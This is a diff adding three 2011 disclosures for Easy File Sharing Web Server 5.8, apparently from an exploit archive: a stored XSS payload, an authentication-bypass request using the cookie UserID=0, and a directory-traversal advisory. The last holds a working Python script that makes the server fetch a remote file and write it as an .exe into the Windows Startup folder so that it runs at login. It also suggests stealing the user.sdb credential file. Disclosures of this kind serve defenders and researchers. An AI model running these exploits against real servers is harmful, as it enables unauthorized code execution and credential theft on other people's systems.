@@ -1,0 +1,148 @@
+------------------------------------------------------------------------
+Software................Easy File Sharing Web Server Version 5.8
+Vulnerability...........Persistent Cross-site Scripting
+Threat Level............Moderate (2/5)
+Download................http://www.sharing-file.com/
+Disclosure Date.........4/6/2011
+Tested On...............Windows Vista
+------------------------------------------------------------------------
+Author..................AutoSec Tools
+Site....................http://www.autosectools.com/
+Email...................John Leitch <john@autosectools.com>
+------------------------------------------------------------------------
+
+
+--Description--
+
+A persistent cross-site scripting vulnerability in Easy File Sharing
+Web Server Version 5.8 can be exploited to execute arbitrary JavaScript.
+
+
+--Exploit--
+
+Enter markup into the title or message fields of a forum message.
+
+
+--PoC--
+
+<script>alert(0)</script>
+
+
+------------------------------------------------------------------------
+Software................Easy File Sharing Web Server Version 5.8
+Vulnerability...........Authentication Bypass
+Threat Level............Serious (3/5)
+Download................http://www.sharing-file.com/
+Disclosure Date.........4/6/2011
+Tested On...............Windows Vista
+------------------------------------------------------------------------
+Author..................AutoSec Tools
+Site....................http://www.autosectools.com/
+Email...................John Leitch <john@autosectools.com>
+------------------------------------------------------------------------
+
+
+--Description--
+
+If the UserID cookie is set all virtual folders become accessible.
+
+
+--PoC--
+
+GET http://localhost/[Virtual Folder] HTTP/1.1
+Host: localhost
+Cookie: UserID=0
+
+
+# ------------------------------------------------------------------------
+# Software................Easy File Sharing Web Server Version 5.8
+# Vulnerability...........Directory Traversal / Arbitrary File Creation
+# Threat Level............Very Critical (5/5)
+# Download................http://www.sharing-file.com/
+# Disclosure Date.........4/6/2011
+# Tested On...............Windows Vista
+# ------------------------------------------------------------------------
+# Author..................AutoSec Tools
+# Site....................http://www.autosectools.com/
+# Email...................John Leitch <john@autosectools.com>
+# ------------------------------------------------------------------------
+# 
+# 
+# --Description--
+# 
+# A directory traversal vulnerability in Easy File Sharing Web Server
+# Version 5.8 can be exploited to navigate the local file system and
+# create arbitrary files. A user account is necessary to exploit. If
+# registration is not open, it may be possible to retrieve the
+# credential containing user.sdb file using directory traversal combined
+# with authentication bypass.
+# 
+# 
+# --Exploit--
+# 
+# http://[server]/[Virtual Folder]/..%2F..%2F/[Folder]
+# 
+# Note: the actual number of traversal sequences required depends on the
+# depth of the folder.
+# 
+# 
+# --PoC--
+
+# Browse:
+# http://localhost/temp/..%2FUsers
+
+import socket, urllib
+
+# Update these
+username = 'a'
+password = 'a'
+
+# The attacker controlled file
+remote_file1 = 'http://www.google.com/images/logos/ps_logo2.png'
+
+# The name of the file on the target server 
+remote_file2 = 'exploit_test.exe'
+
+# The destination of the remote file
+target_folder = 'Users/Test User/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/'
+
+# This must be an existing virtual folder
+path = '/temp'
+
+host = 'localhost'
+port = 80
+
+def upload_shell():
+    for i in reversed(range(0, 16)):
+        print 'trying...'
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((host, port))
+        s.settimeout(8)    
+
+        s.send('POST ' + path + '/' + '..%2F' * i + urllib.quote(target_folder) + ' HTTP/1.1\r\n'
+               'Host: localhost\r\n'
+               'Connection: keep-alive\r\n'
+               'Referer: http://localhost/uploadurl.ghp?vfolder=/temp/test\r\n'
+               'Content-Length: 181\r\n'
+               'Cache-Control: max-age=0\r\n'
+               'Origin: http://localhost\r\n'
+               'User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.151 Safari/534.16\r\n'
+               'Content-Type: application/x-www-form-urlencoded\r\n'
+               'Accept: application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n'
+               'Accept-Encoding: gzip,deflate,sdch\r\n'
+               'Accept-Language: en-US,en;q=0.8\r\n'
+               'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n'
+               '\r\n'
+               'uploadid=21305471&vfoldername=%2ftemp&upload_author=' + username + '&upload_passwd=' + password + '&file_des=&file_url=' + urllib.quote(remote_file1) + '&saveas=' + urllib.quote(remote_file2) + '&uploadurl=Upload')
+
+        resp = s.recv(8192)
+
+        http_ok = 'HTTP/1.0 200 OK'
+        
+        if http_ok not in resp[:len(http_ok)]:
+            print 'error uploading shell'
+        else:
+            print 'shell uploaded'
+            return
+
+upload_shell()
